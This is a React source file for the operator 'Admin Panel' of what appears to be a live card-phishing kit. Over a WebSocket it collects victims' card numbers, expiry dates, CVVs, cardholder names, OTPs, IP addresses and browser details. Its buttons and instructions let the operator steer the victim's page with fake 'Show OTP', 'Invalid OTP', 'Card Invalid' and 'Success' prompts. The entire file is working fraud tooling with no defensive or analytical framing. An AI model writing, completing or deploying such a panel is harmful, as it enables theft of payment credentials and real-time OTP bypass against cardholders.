
import React, { useState, useEffect } from 'react';

interface CardData {
  cardNumber: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
  cardHolder: string;
  amount: string;
}

interface UserInfo {
  ip: string;
  browser: string;
  network: string;
}

interface Visitor {
  ip: string;
  timestamp: Date;
}

const AdminPanel = () => {
  const [cardData, setCardData] = useState<CardData | null>(null);
  const [userInfo, setUserInfo] = useState<UserInfo | null>(null);
  const [otp, setOtp] = useState<string>('');
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [ws, setWs] = useState<WebSocket | null>(null);
  const [showCommands, setShowCommands] = useState(false);
  const [connectionStatus, setConnectionStatus] = useState<string>('Connecting...');

  useEffect(() => {
    // Create WebSocket server connection
    // For railway.com, use the appropriate WebSocket URL
    const wsUrl = window.location.hostname === 'localhost' ? 'ws://localhost:8080' : 'wss://your-railway-domain.railway.app';
    
    const websocket = new WebSocket(wsUrl);
    
    websocket.onopen = () => {
      console.log('Admin panel connected to WebSocket');
      setConnectionStatus('Connected');
    };
    
    websocket.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        console.log('Received data in admin panel:', data);
        
        if (data.type === 'cardData') {
          setCardData(data.data);
          setUserInfo(data.userInfo);
          setShowCommands(true); // Show commands when new card data arrives
          
          // Add new visitor
          const newVisitor = {
            ip: data.userInfo.ip,
            timestamp: new Date()
          };
          setVisitors(prev => [...prev, newVisitor]);
        } else if (data.type === 'otp') {
          setOtp(data.otp);
        } else if (data.type === 'newVisitor') {
          const newVisitor = {
            ip: data.ip,
            timestamp: new Date()
          };
          setVisitors(prev => [...prev, newVisitor]);
        }
      } catch (error) {
        console.error('Error parsing WebSocket message:', error);
      }
    };
    
    websocket.onclose = () => {
      console.log('WebSocket connection closed');
      setConnectionStatus('Disconnected');
      // Try to reconnect after 3 seconds
      setTimeout(() => {
        window.location.reload();
      }, 3000);
    };

    websocket.onerror = (error) => {
      console.error('WebSocket error:', error);
      setConnectionStatus('Error');
    };
    
    setWs(websocket);
    
    return () => {
      websocket.close();
    };
  }, []);

  const sendCommand = (command: string) => {
    if (ws && ws.readyState === WebSocket.OPEN) {
      console.log('Sending command:', command);
      ws.send(JSON.stringify({ command }));
    } else {
      console.error('WebSocket not connected');
    }
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white p-6">
      <h1 className="text-3xl font-bold mb-8 text-center">Admin Panel</h1>
      
      {/* Connection Status */}
      <div className="mb-4">
        <span className={`px-3 py-1 rounded text-sm ${
          connectionStatus === 'Connected' ? 'bg-green-600' : 
          connectionStatus === 'Connecting...' ? 'bg-yellow-600' : 'bg-red-600'
        }`}>
          WebSocket: {connectionStatus}
        </span>
      </div>
      
      {/* Visitors Section */}
      <div className="mb-8">
        <h2 className="text-xl font-bold mb-4">Active Visitors ({visitors.length})</h2>
        <div className="space-y-2">
          {visitors.length === 0 ? (
            <div className="text-gray-400">No visitors yet...</div>
          ) : (
            visitors.map((visitor, index) => (
              <div key={index} className="bg-red-600 text-white p-2 rounded mb-2 inline-block mr-2">
                New Visitor: {visitor.ip} - {visitor.timestamp.toLocaleTimeString()}
              </div>
            ))
          )}
        </div>
      </div>

      {/* User Info Section */}
      {userInfo && (
        <div className="bg-gray-800 p-4 rounded mb-6">
          <h2 className="text-xl font-bold mb-4">User Information</h2>
          <div className="grid grid-cols-3 gap-4">
            <div>
              <span className="font-bold">IP Address:</span> {userInfo.ip}
            </div>
            <div>
              <span className="font-bold">Browser:</span> {userInfo.browser}
            </div>
            <div>
              <span className="font-bold">Network:</span> {userInfo.network}
            </div>
          </div>
        </div>
      )}

      {/* Card Data Section with Commands */}
      {cardData && (
        <div className="bg-gray-800 p-4 rounded mb-6">
          <h2 className="text-xl font-bold mb-4">Card Information</h2>
          <div className="font-bold text-lg flex items-center justify-between flex-wrap">
            <span className="mr-4">
              {cardData.cardNumber} | {cardData.expiryMonth}/{cardData.expiryYear} | {cardData.cvv} | {cardData.cardHolder} | Amount: ₹{cardData.amount} {otp && `| OTP: ${otp}`}
            </span>
            {showCommands && (
              <div className="flex space-x-2 mt-2">
                <button
                  onClick={() => sendCommand('showotp')}
                  className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-1 px-2 rounded text-xs"
                >
                  Show OTP
                </button>
                <button
                  onClick={() => sendCommand('fail')}
                  className="bg-red-600 hover:bg-red-700 text-white font-bold py-1 px-2 rounded text-xs"
                >
                  Fail
                </button>
                <button
                  onClick={() => sendCommand('success')}
                  className="bg-green-600 hover:bg-green-700 text-white font-bold py-1 px-2 rounded text-xs"
                >
                  Success
                </button>
                <button
                  onClick={() => sendCommand('invalidotp')}
                  className="bg-yellow-600 hover:bg-yellow-700 text-white font-bold py-1 px-2 rounded text-xs"
                >
                  Invalid OTP
                </button>
                <button
                  onClick={() => sendCommand('cardinvalid')}
                  className="bg-purple-600 hover:bg-purple-700 text-white font-bold py-1 px-2 rounded text-xs"
                >
                  Card Invalid
                </button>
                <button
                  onClick={() => sendCommand('carddisabled')}
                  className="bg-orange-600 hover:bg-orange-700 text-white font-bold py-1 px-2 rounded text-xs"
                >
                  Card Disabled
                </button>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Instructions */}
      <div className="bg-gray-800 p-4 rounded">
        <h3 className="text-lg font-bold mb-2">Instructions</h3>
        <ul className="text-sm space-y-1">
          <li>• Wait for card data to appear above</li>
          <li>• Use "Show OTP" to display OTP form to user</li>
          <li>• Use "Success" to complete payment successfully</li>
          <li>• Use "Fail", "Card Invalid", or "Card Disabled" to show error messages</li>
          <li>• Use "Invalid OTP" to reject OTP and ask for re-entry</li>
        </ul>
      </div>
    </div>
  );
};

export default AdminPanel;
